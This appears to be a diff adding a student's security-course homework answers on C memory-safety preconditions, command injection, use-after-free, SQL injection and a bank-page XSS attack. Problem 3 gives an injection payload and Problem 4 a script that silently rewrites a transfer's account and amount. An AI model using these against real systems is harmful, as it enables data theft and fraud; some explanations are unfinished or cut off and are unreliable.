@@ -1,0 +1,90 @@
+Problem 1.
+1.  pre-cond:   region of memory allocated to a is greater than or equal to
+                region of memory allocated to b
+    pre-cond:   a != NULL
+    pre-cond:   b != NULL
+    pre-cond:   a is a valid character pointer
+    pre-cond:   b is a valid character pointer
+    pre-cond:   b is null-terminated
+
+2.  pre-cond: a != NULL
+    pre-cond: a is a valid character pointer
+    pre-cond: strlen(a) > 1
+
+3.  pre-cond: a is a valid character pointer
+    pre-cond: a != NULL
+    pre-cond: strlen(a) < sizeof(char *)
+    These pre-conditions would prevent segmentation faults, but not memory leaks.
+
+4.  pre-cond: a is a valid character pointer
+    pre-cond: a != NULL
+    pre-cond: i < SIZE_MAX
+    pre-cond: i > 0
+    pre-cond: strlen(a) >= i
+
+5.  No set of pre-conditions can ensure memory safety in this case since the memory
+    location being written to is pointed to by an unknown and possibly invalid pointer.
+
+Problem 2. (Not finished)
+How might attacker execute aribitrary code?
+1.  Vulnerability:
+    Prevention: Non executable stack and heap, ASLR
+
+2.  Note: The code provided isn't functional as it will step out of the array's
+    bounds resulting in a segmentation fault if there was a semicolon.
+    It should iterate up until strlen(a) - 1 instead.
+
+    Vulnerability: the semicolons are shifted, but that doesn't deter attackers
+    from entering arbitrary commands since the input is not sanitized.
+    For example, an attacker could succesfull start up a shell with "bash" and
+    then interact with the system and run code.
+    Prevention: No techniques can really be used to prevent attackers, as this
+    function gives them full access to execute any aribtrary code.
+
+3.  Vulnerability: Free deallocates memory from a pointer, and makes it so the
+    resource is up for grabs. In the for loop, the pointers are freed, but are
+    not set to NULL. This means the pointer that was just freed is still
+    referencing the same memory address, only now that memory location may be
+    allocated to another variable. This corrupts the underlying memory management
+    data structure (usually a doubly linked list) into referencing the memory
+    This leaves the pointers susceptable to a "double free attack", where if
+    malloc is called again
+    Prevention: Set *a to NULL after completing free.
+
+Problem 3.
+I'm assuming that you can include comments in the SQL query string.
+For the parameters title and date are treated as a string and a date,
+respectively. This is accomplished by the prepared statement p using setString
+and setDate. But the parameter col may be a query itself, as it is not
+sanitized or treated as a particuler data type. This allows for a user to
+gain access to records in the database which might be prohibited otherwise. An
+example argument might be
+
+   (1) col = "SELECT * FROM information_schema.tables WHERE TABLE_TYPE = 'BASE_TABE' AND (1=1 OR (a = ? AND b = ?)) --"
+
+Which would query the database for all tables, and comment out the rest of the
+query.
+
+
+Problem 4.
+One method would be to do a stored/persistent XSS attack which is where you have
+a direct script to your server/browser, which now has full access to
+everything in origin (in this case, mybank.com). The external javascript file
+widget.js would look like this:
+
+var myAcct = "2325235"
+var myAmount = "420"
+window.onload = function() {
+    var inputVariables = document.getElementsByTagName("input")
+    inputVariables[3].onclick = function() {
+        inputVariables[1].value = myAcct
+        inputVariables[2].value = myAmount
+    }
+}
+
+Which sets the new destination account to myAcct and amount to myAmount before
+the form is sent to the backend.
+
+
+
+(1) ref: https://www.mssqltips.com/sqlservertutorial/196/informationschematables/
